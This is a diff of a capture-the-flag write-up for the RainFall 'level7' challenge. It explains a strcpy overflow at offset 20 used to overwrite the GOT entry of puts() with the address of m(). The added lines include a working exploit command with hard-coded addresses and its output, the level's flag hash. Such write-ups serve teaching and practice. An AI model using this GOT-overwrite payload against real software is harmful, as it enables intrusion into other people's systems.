@@ -79,5 +79,17 @@ strcpy(0x37614136, NULL <unfinished ...>
 +++ killed by SIGSEGV +++
 ~~~
 Here, we can observe, that it overflows at the offset of 20 - **rewriting** the dest arg of the second strcpy. 
+So we use the seemingly useless function **puts()** taht has no real effect in the program flow, and rewrite it with **m()**.
+
+The payload will look like this:  
+argument 1: offset of 20 + address of puts() taken from GOT (**0x08049928**)  
+argument 2: address of m() (**0x080484f4**)- so the second strcpy will use it as "dest" to copy it into, alternating the program flow.
+
+~~~shell
+level7@RainFall:~$ ./level7 $(python -c "print 10 * '42' + '\x08\x04\x99\x28'[::-1]") $(python -c "print '\x08\x04\x84\xf4'[::-1]")
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1724425505
+~~~
+
 
 
